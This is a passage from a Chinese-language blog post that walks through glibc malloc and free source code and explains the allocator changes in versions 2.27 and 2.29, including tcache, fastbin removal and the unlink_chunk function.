class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">   after getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">  locked = <span class="number">1</span>;</span><br><span class="line">  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">      &#125;))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (! have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);<span class="comment">//计算索引</span></span><br><span class="line">    fb = &amp;fastbin (av, idx);<span class="comment">//初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">   (i.e., double free).  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">   size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">   only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">   deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">  old_idx = fastbin_index(chunksize(old));</span><br><span class="line">p-&gt;fd = old2 = old;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>fastbin在free的时候是不检测周边chunk的情况的,直接放入不进行其他操作</p><h3 id="smallbin-amp-amp-largebin"><a href="#smallbin-amp-amp-largebin" class="headerlink" title="smallbin&amp;&amp;largebin"></a>smallbin&amp;&amp;largebin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      (<span class="type">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//进行了一系列的检测</span></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">unlink(av, nextchunk, bck, fwd);</span><br><span class="line">size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);<span class="comment">//清除p位</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av);<span class="comment">//      统一放入unsortedbin</span></span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;<span class="comment">//largebin清空nextsize链</span></span><br><span class="line">&#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;<span class="comment">//fd,bk链设置</span></span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);<span class="comment">//设置p位</span></span><br><span class="line">      set_foot(p, size);<span class="comment">//设置下一个chunk的prev_size</span></span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//nextchunk是topchunk的情况</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);<span class="comment">//触发malloc_consolidate</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))<span class="comment">//收缩堆</span></span><br><span class="line">  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">assert(heap-&gt;ar_ptr == av);</span><br><span class="line">heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="glibc2-27"><a href="#glibc2-27" class="headerlink" title="glibc2.27"></a>glibc2.27</h1><p>变化比较大的就是多了个tcache</p><h2 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc变化"><a href="#libc变化" class="headerlink" title="libc变化"></a>libc变化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>在_libc_malloc中添加了tcache操作,可以直接在_libc_malloc获得chunk返回</p><h3 id="fastbin-1"><a href="#fastbin-1" class="headerlink" title="fastbin"></a>fastbin</h3><p>fastbin比较大的变化是移除fastchunk的操作会因为操作线程做区分</p><p>其中一个由一个宏完成</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line"><span class="meta">  do\</span></span><br><span class="line"><span class="meta">    &#123;\</span></span><br><span class="line"><span class="meta">      victim = pp;\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (victim == NULL)\</span></span><br><span class="line"><span class="meta">break;\</span></span><br><span class="line"><span class="meta">    &#125;\</span></span><br><span class="line"><span class="meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span></span><br><span class="line"><span class="meta"> != victim);</span></span><br></pre></td></tr></table></figure><h3 id="tcache填充机制"><a href="#tcache填充机制" class="headerlink" title="tcache填充机制"></a>tcache填充机制</h3><p><strong>fastbin</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line">     <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">     <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>smallbin</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">    stash them in the tcache.  */</span></span><br><span class="line"> <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line"> <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">   &#123;</span><br><span class="line">     mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">     <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">           &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>在一个链中取出chunk后如果该链还有剩余chunk,且tcache对应链表有空闲位置,则将剩余chunk移入tcache中</p><h3 id="unsortedbin取出受tcache影响"><a href="#unsortedbin取出受tcache影响" class="headerlink" title="unsortedbin取出受tcache影响"></a>unsortedbin取出受tcache影响</h3><ol><li>依然还是先尝试使用last_remainer分配并返回</li><li>但之后如果找到了大小刚好合适的victim也会先放入tcache中,如果<strong>tcache满了则直接返回</strong></li><li>如果大小不合适则是依然放入到对应bin中</li><li>如果所需要chunk已被找到并放入tcache,那么在处理完一定数量的chunk后会直接结束循环,并从tcache返回所需要的chunk</li><li>如果所有的chunk都被处理完,并且之前有找到所需要的chunk则返回tcache中的chunk</li></ol><h2 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h2><h3 id="libc-free则没有添加tache相关"><a href="#libc-free则没有添加tache相关" class="headerlink" title="_libc_free则没有添加tache相关"></a>_libc_free则没有添加tache相关</h3><h3 id="free会首先尝试放入tcache"><a href="#free会首先尝试放入tcache" class="headerlink" title="free会首先尝试放入tcache"></a>free会首先尝试放入tcache</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &#123;</span><br><span class="line">   <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">     &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>优先度高于各种合并</p><h2 id="malloc-state新增成员"><a href="#malloc-state新增成员" class="headerlink" title="malloc_state新增成员"></a>malloc_state新增成员</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line"><span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line"><span class="type">int</span> have_fastchunks;</span><br></pre></td></tr></table></figure><p>这样的话unsortedbin泄露地址偏移就需要进行一定调整了,虽然是int类型但因为对齐要求占用了8字节</p><h2 id="tcache的一些注意点"><a href="#tcache的一些注意点" class="headerlink" title="tcache的一些注意点"></a>tcache的一些注意点</h2><p><strong>0x1</strong></p><p>tcache会在堆中创建一个chunk存储<strong>tcache_perthread_struct</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>一般大小是64*8+64+0x10=0x250</p><p><strong>0x2</strong></p><p>此外tcache中next指针不是指向chunk的真实地址</p><p>而是指向mem区域</p><h1 id="glibc2-29"><a href="#glibc2-29" class="headerlink" title="glibc2.29"></a>glibc2.29</h1><h2 id="tcache本身变化"><a href="#tcache本身变化" class="headerlink" title="tcache本身变化"></a>tcache本身变化</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>成员多了个key,get和put函数也多了一些对应的操作</p><h2 id="宏unlink相关"><a href="#宏unlink相关" class="headerlink" title="宏unlink相关"></a>宏unlink相关</h2><p><strong>宏unlink</strong>现在由<strong>函数unlink_chunk</strong>实现</p><p>但内部具体代码并无明显变化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 